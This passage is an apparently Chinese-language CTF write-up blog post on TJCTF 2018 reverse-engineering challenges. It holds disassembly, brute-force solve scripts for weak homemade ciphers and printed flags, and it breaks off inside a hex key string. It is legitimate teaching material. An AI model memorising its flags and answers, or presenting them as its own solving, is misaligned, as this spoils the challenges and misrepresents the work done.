<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="referrer" content="no-referrer" />
    <meta name="description" content="面向高中生的CTF，题目很简单，记录一下过程和几个脚本 0x01 Validator首先定义了一段字符串 1234567891011mov     dword ptr [ebp+s1], 74636A74hmov     [ebp+var_34], 756A7B66hmov     [ebp+var_30], 635F3735hmov     [ebp+var_2C], 5F6C6C34hmov">
<meta property="og:type" content="article">
<meta property="og:title" content="TJCTF2018_Re&amp;&amp;PWN">
<meta property="og:url" content="http://yoursite.com/2018/08/16/TJCTF2018-Re-PWN/index.html">
<meta property="og:site_name" content="Kirin&#39;s Blog">
<meta property="og:description" content="面向高中生的CTF，题目很简单，记录一下过程和几个脚本 0x01 Validator首先定义了一段字符串 1234567891011mov     dword ptr [ebp+s1], 74636A74hmov     [ebp+var_34], 756A7B66hmov     [ebp+var_30], 635F3735hmov     [ebp+var_2C], 5F6C6C34hmov">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-958f7fc963529a07.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-181599f4141f6a02.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-8ab10ef332fe6ac2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-5f4217c5f78241f0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-8b27573887e51254.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-d567b62886e3a546.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7434375-5bf5a96683aae486.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
<meta property="article:published_time" content="2018-08-16T12:40:19.000Z">
<meta property="article:modified_time" content="2018-08-16T12:54:50.000Z">
<meta property="article:author" content="Kirin">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="Re">
<meta property="article:tag" content="PWN">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/7434375-958f7fc963529a07.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
    
    
        
          
              <link rel="shortcut icon" href="/images/logo.jpg">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/logo.jpg" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.jpg">
          
        
    
    <!-- title -->
    <title>TJCTF2018_Re&amp;&amp;PWN</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 4.2.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/CTF-Writeups/">CTF-Writeups</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2018/08/18/ret2-dl-runtime-resolve/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2018/07/21/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%AC%AC%E4%B8%80%E5%9C%BA-Re/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/08/16/TJCTF2018-Re-PWN/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/08/16/TJCTF2018-Re-PWN/&text=TJCTF2018_Re&amp;&amp;PWN" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/08/16/TJCTF2018-Re-PWN/&title=TJCTF2018_Re&amp;&amp;PWN" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/08/16/TJCTF2018-Re-PWN/&is_video=false&description=TJCTF2018_Re&amp;&amp;PWN" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=TJCTF2018_Re&amp;&amp;PWN&body=Check out this article: http://yoursite.com/2018/08/16/TJCTF2018-Re-PWN/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/08/16/TJCTF2018-Re-PWN/&title=TJCTF2018_Re&amp;&amp;PWN" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/08/16/TJCTF2018-Re-PWN/&title=TJCTF2018_Re&amp;&amp;PWN" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/08/16/TJCTF2018-Re-PWN/&title=TJCTF2018_Re&amp;&amp;PWN" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/08/16/TJCTF2018-Re-PWN/&title=TJCTF2018_Re&amp;&amp;PWN" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/08/16/TJCTF2018-Re-PWN/&name=TJCTF2018_Re&amp;&amp;PWN&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-Validator"><span class="toc-number">1.</span> <span class="toc-text">0x01 Validator</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-Python-Reversing"><span class="toc-number">2.</span> <span class="toc-text">0x02 Python Reversing</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-Bad-Cipher"><span class="toc-number">3.</span> <span class="toc-text">0x03 Bad Cipher</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-Bricked-Binary"><span class="toc-number">4.</span> <span class="toc-text">0x04 Bricked Binary</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-Math-Whiz"><span class="toc-number">5.</span> <span class="toc-text">0x05 Math Whiz</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x06-Tilted-Troop"><span class="toc-number">6.</span> <span class="toc-text">0x06 Tilted Troop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x07-Future-Canary-Lab"><span class="toc-number">7.</span> <span class="toc-text">0x07 Future Canary Lab</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x08-Online-Banking"><span class="toc-number">8.</span> <span class="toc-text">0x08 Online Banking</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x09-Secure-Secrets"><span class="toc-number">9.</span> <span class="toc-text">0x09 Secure Secrets</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x0A-Super-Secure-Secrets"><span class="toc-number">10.</span> <span class="toc-text">0x0A Super Secure Secrets</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#复用get-message"><span class="toc-number">10.1.</span> <span class="toc-text">复用get_message</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ROP"><span class="toc-number">10.2.</span> <span class="toc-text">ROP</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        TJCTF2018_Re&amp;&amp;PWN
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Kirin's Blog</span>
      </span>
      
    <div class="postdate">
        <time datetime="2018-08-16T12:40:19.000Z" itemprop="datePublished">2018-08-16</time>
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/CTF/">CTF</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="tag-link" href="/tags/PWN/" rel="tag">PWN</a>, <a class="tag-link" href="/tags/Re/" rel="tag">Re</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p>面向高中生的CTF，题目很简单，记录一下过程和几个脚本</p>
<h3 id="0x01-Validator"><a href="#0x01-Validator" class="headerlink" title="0x01 Validator"></a>0x01 Validator</h3><p>首先定义了一段字符串</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mov     dword ptr [ebp+s1], 74636A74h</span><br><span class="line">mov     [ebp+var_34], 756A7B66h</span><br><span class="line">mov     [ebp+var_30], 635F3735h</span><br><span class="line">mov     [ebp+var_2C], 5F6C6C34h</span><br><span class="line">mov     [ebp+var_28], 725F336Dh</span><br><span class="line">mov     [ebp+var_24], 72337633h</span><br><span class="line">mov     [ebp+var_20], 365F3335h</span><br><span class="line">mov     [ebp+var_1C], 665F6430h</span><br><span class="line">mov     [ebp+var_18], 5F6D3072h</span><br><span class="line">mov     [ebp+var_14], 5F77306Eh</span><br><span class="line">mov     [ebp+var_10], 7D6E30h</span><br></pre></td></tr></table></figure>
<p>提取出来是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tjctf&#123;ju57_c4ll_m3_r3v3r53_60d_fr0m_n0w_0n&#125;</span><br></pre></td></tr></table></figure>
<p>而后对其中几个字符进行了替换：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov     byte ptr [ebp+var_28+3], 33h</span><br><span class="line">mov     byte ptr [ebp+var_24+2], 33h</span><br><span class="line">mov     byte ptr [ebp+var_20], 33h</span><br><span class="line">mov     byte ptr [ebp+var_24], 35h</span><br><span class="line">mov     byte ptr [ebp+var_24+1], 72h</span><br><span class="line">mov     byte ptr [ebp+var_20+1], 72h</span><br><span class="line">mov     byte ptr [ebp+var_24+3], 76h</span><br></pre></td></tr></table></figure>
<p>直接动态调试过程中copy下来即可：<br><img src="https://upload-images.jianshu.io/upload_images/7434375-958f7fc963529a07.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="flag"></p>
<h3 id="0x02-Python-Reversing"><a href="#0x02-Python-Reversing" class="headerlink" title="0x02 Python Reversing"></a>0x02 Python Reversing</h3><p>source：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line"></span><br><span class="line">flag &#x3D; &#39;redacted&#39;</span><br><span class="line"></span><br><span class="line">np.random.seed(12345)</span><br><span class="line">arr &#x3D; np.array([ord(c) for c in flag])</span><br><span class="line">other &#x3D; np.random.randint(1,5,(len(flag)))</span><br><span class="line">arr &#x3D; np.multiply(arr,other)</span><br><span class="line"></span><br><span class="line">b &#x3D; [x for x in arr]</span><br><span class="line">lmao &#x3D; [ord(x) for x in &#39;&#39;.join([&#39;ligma_sugma_sugondese_&#39;*5])]</span><br><span class="line">c &#x3D; [b[i]^lmao[i] for i,j in enumerate(b)]</span><br><span class="line">print(&#39;&#39;.join(bin(x)[2:].zfill(8) for x in c))</span><br><span class="line"></span><br><span class="line"># original_output was 1001100001011110110100001100001010000011110101001100100011101111110100011111010101010000000110000011101101110000101111101010111011100101000011011010110010100001100010001010101001100001110110100110011101</span><br></pre></td></tr></table></figure>
<p>很显然seed确定，从前向后按位破解即可：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line"></span><br><span class="line">key&#x3D;&quot;1001100001011110110100001100001010000011110101001100100011101111110100011111010101010000000110000011101101110000101111101010111011100101000011011010110010100001100010001010101001100001110110100110011101&quot;</span><br><span class="line">print(len(key))</span><br><span class="line">ans2&#x3D;&quot;&quot;</span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">for q in range(25):</span><br><span class="line">  for w in range(30,127):</span><br><span class="line">   flag&#x3D;ans2+chr(w)</span><br><span class="line">   np.random.seed(12345)</span><br><span class="line">   arr &#x3D; np.array([ord(c) for c in flag])</span><br><span class="line">   other &#x3D; np.random.randint(1,5,(len(flag)))</span><br><span class="line">   arr &#x3D; np.multiply(arr,other)</span><br><span class="line"></span><br><span class="line">   b &#x3D; [x for x in arr]</span><br><span class="line">   lmao &#x3D; [ord(x) for x in &#39;&#39;.join([&#39;ligma_sugma_sugondese_&#39;*5])]</span><br><span class="line">   c &#x3D; [b[i]^lmao[i] for i,j in enumerate(b)]</span><br><span class="line">   t&#x3D;&#39;&#39;.join(bin(x)[2:].zfill(8) for x in c)</span><br><span class="line">   if t[len(t)-9:len(t)]&#x3D;&#x3D;key[len(t)-9:len(t)]:</span><br><span class="line">       ans2+&#x3D;chr(w)</span><br><span class="line">       print(ans2)</span><br><span class="line">       break</span><br><span class="line"></span><br><span class="line"># original_output was 1001100001011110110100001100001010000011110101001100100011101111110100011111010101010000000110000011101101110000101111101010111011100101000011011010110010100001100010001010101001100001110110100110011101</span><br></pre></td></tr></table></figure>
<h3 id="0x03-Bad-Cipher"><a href="#0x03-Bad-Cipher" class="headerlink" title="0x03 Bad Cipher"></a>0x03 Bad Cipher</h3><p>source:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">message &#x3D; &quot;[REDACTED]&quot;</span><br><span class="line">key &#x3D; &quot;&quot;</span><br><span class="line"></span><br><span class="line">r,o,u,x,h&#x3D;range,ord,chr,&quot;&quot;.join,hex</span><br><span class="line">def e(m,k):</span><br><span class="line"> l&#x3D;len(k);s&#x3D;[m[i::l]for i in r(l)]</span><br><span class="line"> for i in r(l):</span><br><span class="line">  a,e&#x3D;0,&quot;&quot;</span><br><span class="line">  for c in s[i]:</span><br><span class="line">   a&#x3D;o(c)^o(k[i])^(a&gt;&gt;2)</span><br><span class="line">   e+&#x3D;u(a)</span><br><span class="line">  s[i]&#x3D;e</span><br><span class="line"> return x(h((1&lt;&lt;8)+o(f))[3:]for f in x(x(y)for y in zip(*s)))</span><br><span class="line"></span><br><span class="line">print(e(message,key))</span><br></pre></td></tr></table></figure>
<p>hint：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Written by nthistle</span><br><span class="line">My friend insisted on using his own cipher program to encrypt this flag, but I don&#39;t think it&#39;s very secure. Unfortunately, he is quite good at Code Golf, and it seems like he tried to make the program as short (and confusing!) as possible before he sent it.</span><br><span class="line">I don&#39;t know the key length, but I do know that the only thing in the plaintext is a flag. Can you break his cipher for me?</span><br></pre></td></tr></table></figure>
<p>原程序进行了简化<br>还原一下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">def e(mes,k):</span><br><span class="line"> l&#x3D;len(k)</span><br><span class="line"> s&#x3D;[mes[i::l]for i in range(l)]</span><br><span class="line"> print(s)</span><br><span class="line"> for i in range(l):</span><br><span class="line">  a,e&#x3D;0,&quot;&quot;</span><br><span class="line">  for c in s[i]:</span><br><span class="line">   a&#x3D;ord(c)^ord(k[i])^(a&gt;&gt;2)</span><br><span class="line">   e+&#x3D;chr(a)</span><br><span class="line">  s[i]&#x3D;e</span><br><span class="line"> return &quot;&quot;.join(hex(ord(f))[2:]for f in &quot;&quot;.join(&quot;&quot;.join(y)for y in zip(*s)))</span><br></pre></td></tr></table></figure>
<p>可以看到<br>类似AES加密中间一步的操作<br>根据hint：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I don&#39;t know the key length, but I do know that the only thing in the plaintext is a flag. Can you break his cipher for me?</span><br></pre></td></tr></table></figure>
<p>密钥长度未知，但是原文只有flag<br>说明:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">len(flag)%len(key)&#x3D;0</span><br></pre></td></tr></table></figure>
<p>否则原文最终会丢弃取模后的余数，导致最终密文不完整，也就无法反解出flag<br>根据密文：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">473c23192d4737025b3b2d34175f66421631250711461a7905342a3e365d08190215152f1f1e3d5c550c12521f55217e500a3714787b6554</span><br></pre></td></tr></table></figure>
<p>len(flag)=56<br>猜测len(key)=7或者8<br><strong>根据算法解密,并根据flag开头为”tjctf{“按位爆破key前6位，再随机组合爆破后几位(猜测1或2)</strong>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">m&#x3D;&quot;473c23192d4737025b3b2d34175f66421631250711461a7905342a3e365d08190215152f1f1e3d5c550c12521f55217e500a3714787b6554&quot;.decode(&quot;hex&quot;)</span><br><span class="line">ans2&#x3D;&quot;tjctf&#123;&quot;</span><br><span class="line">for qw in range(32,127):</span><br><span class="line">	for er in range(32,127):</span><br><span class="line">#		for ty in range(32,127):</span><br><span class="line">			k&#x3D;&quot;3V@mK&lt;&quot;+chr(qw)+chr(er)</span><br><span class="line">			l&#x3D;len(k)</span><br><span class="line">			s&#x3D;[m[i::l]for i in range(l)]</span><br><span class="line">			for i in range(l):</span><br><span class="line">			  a,e&#x3D;&quot;&quot;,&quot;&quot;</span><br><span class="line">			  a&#x3D;s[i][0]</span><br><span class="line">			  t&#x3D;chr(ord(s[i][0])^ord(k[i]))</span><br><span class="line">			  for c in s[i][1:]:</span><br><span class="line">			   e+&#x3D;chr(ord(c)^ord(k[i])^(ord(a)&gt;&gt;2))</span><br><span class="line">			   a&#x3D;c</span><br><span class="line">			  s[i]&#x3D;t+e</span><br><span class="line">			ans&#x3D;&quot;&quot;.join(f for f in &quot;&quot;.join(&quot;&quot;.join(y)for y in zip(*s)))</span><br><span class="line">			if ans[len(ans)-1:len(ans)]&#x3D;&#x3D;&quot;&#125;&quot;:</span><br><span class="line">				print k,ans</span><br></pre></td></tr></table></figure>
<p>(其实这里可以对ans进行过滤，使其只print全为可见字符的一组，不过直接跑出来锁定的数据也比较少，可以直接找到flag)</p>
<h3 id="0x04-Bricked-Binary"><a href="#0x04-Bricked-Binary" class="headerlink" title="0x04 Bricked Binary"></a>0x04 Bricked Binary</h3><p>hint：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Earlier, I input my flag to this image and received 22c15d5f23238a8fff8d299f8e5a1c62 as the output. Unfortunately, later on I broke the program and also managed to lose my flag. Can you find it for me?</span><br></pre></td></tr></table></figure>
<p>提示：I broke the program<br>看到程序这里：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mov     [ebp+src], offset unk_8048684</span><br><span class="line">mov     eax, [ebx+4]</span><br><span class="line">add     eax, 4</span><br><span class="line">mov     eax, [eax]</span><br><span class="line">sub     esp, 8</span><br><span class="line">push    [ebp+src]       ; src</span><br><span class="line">push    eax             ; dest</span><br><span class="line">call    _strcpy</span><br><span class="line">add     esp, 10h</span><br><span class="line">mov     eax, [ebx+4]</span><br><span class="line">add     eax, 4</span><br><span class="line">mov     eax, [eax]</span><br><span class="line">sub     esp, 0Ch</span><br><span class="line">push    eax             ; s</span><br><span class="line">call    hash</span><br></pre></td></tr></table></figure>
<p>而unk_8048684处为”db 0”<br>显然这个”call    _strcpy”有问题<br>看到hash函数对命令行参数进行了处理：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl hash(char *s)</span><br><span class="line">&#123;</span><br><span class="line">  int result; &#x2F;&#x2F; eax</span><br><span class="line">  int i; &#x2F;&#x2F; [esp+4h] [ebp-14h]</span><br><span class="line">  signed int v3; &#x2F;&#x2F; [esp+8h] [ebp-10h]</span><br><span class="line"></span><br><span class="line">  v3 &#x3D; strlen(s);</span><br><span class="line">  for ( i &#x3D; 0; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result &#x3D; i;</span><br><span class="line">    if ( i &gt;&#x3D; v3 )</span><br><span class="line">      break;</span><br><span class="line">    s[v3 - 1 - i] &#x3D; LOBYTE(u[i]) ^ LOBYTE(v[s[v3 - 1 - i]]);</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>利用程序定义好的u和v两个数组进行一种简单的异或加密<br>密文输出：<strong>22c15d5f23238a8fff8d299f8e5a1c62</strong><br>首先可以直接提取u和v数组后逆算法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ans&#x3D;&quot;22c15d5f23238a8fff8d299f8e5a1c62&quot;</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">k&#x3D;&quot;81000000CD0000000A00000073000000B30000003B00000032000000B60000006E0000007C0000003100000057000000D1000000C5000000150000003A00000092000000B4000000E200000051000000AE000000420000005500000041000000E100000070000000300000001A0000000200000084000000A2000000E7000000B90000004D0000003C000000A30000000B000000B20000002B000000AB000000460000007E000000240000009C000000850000006F000000E4000000C40000005F000000CE0000004F0000000100000082000000FD0000006C000000AC000000DF000000640000000C000000A1000000E30000009E0000005D000000BB000000FE000000D30000002900000096000000C7000000F3000000FC00000065000000AA0000008A0000005A000000F5000000B700000038000000A50000008D000000D80000008E0000003900000007000000DE000000D50000001100000080000000E50000008900000035000000FF000000DD000000A60000001F000000230000000D000000C000000093000000C8000000670000001700000068000000180000008B00000062000000CC0000009D000000DA0000005600000066000000C60000007F000000E600000086000000E000000022000000C20000000F0000001B000000F60000002D0000006300000033000000910000007100000059000000EB000000A9000000D200000083000000BF0000003D0000006A00000008000000F9000000A70000004000000000000000E800000052000000BE000000FA0000004E0000002600000076000000CF000000540000007D0000001900000006000000F8000000D00000007400000028000000050000003F000000A00000001E000000C10000004500000049000000D4000000AF000000030000009B0000002F000000EE000000270000009A000000A400000097000000480000004A000000D90000003700000047000000AD00000044000000CA000000EF000000D7000000B8000000DB000000F00000009F0000005800000053000000EA0000002A0000007A00000036000000870000008C000000B50000007200000088000000B100000009000000F1000000160000003E0000006900000014000000EC00000025000000BC000000ED000000BA000000BD0000002C000000C9000000DC00000013000000F4000000750000001D0000004B000000C300000034000000100000006B00000077000000980000005E0000005C000000990000008F0000001200000094000000CB0000002E0000004C000000E900000020000000F70000004300000060000000FB0000006D0000001C000000780000000E000000B0000000D600000050000000790000007B0000006100000095000000A8000000040000005B000000F20000009000000021000000&quot;</span><br><span class="line">key&#x3D;&quot;040000000700000005000000080000000C0000000A00000006000000020000000D00000001000000000000000E000000090000000B000000030000000F000000CA000000DE000000140000009400000029000000E9000000440000004B00000084000000E4000000D70000003A000000620000003F000000EF000000B70000007A0000009F000000F7000000FD0000005600000052000000B9000000C70000003E0000005C000000C4000000D5000000E1000000C900000093000000760000004800000088000000BF00000067000000A4000000EA000000D000000017000000CE00000098000000BB000000AC0000001C000000AB000000C100000026000000A600000083000000DD00000010000000960000009D00000080000000190000009C000000AF00000091000000D8000000AD000000A5000000B400000071000000DA000000F90000008C00000077000000A800000075000000A7000000550000003B000000FE000000E8000000ED0000006100000024000000950000005400000063000000AE0000004A000000DF0000003100000036000000F30000008D0000001D00000059000000470000005D00000074000000C00000006C0000002200000069000000BE000000EE0000008A00000034000000D30000001500000070000000BC000000F000000097000000F4000000E6000000D40000004C000000F100000079000000B800000073000000DC00000035000000D2000000CB0000005F0000008E000000C80000003800000032000000FB000000FA0000007B000000CD0000005A00000090000000A1000000A3000000580000008B000000B0000000D9000000B30000007D000000EB000000D100000078000000FC0000008600000050000000BD00000039000000C20000005E000000BA00000030000000230000004300000028000000CF0000006E000000E500000051000000DB000000B5000000A9000000E700000020000000210000006A000000B2000000F600000042000000E3000000E00000004F00000027000000810000002B0000007E000000A2000000F500000089000000D6000000FF0000001200000046000000400000009A000000600000007F0000002D000000130000001F00000087000000CC0000001A00000092000000110000002C000000B10000005700000085000000C6000000B6000000660000008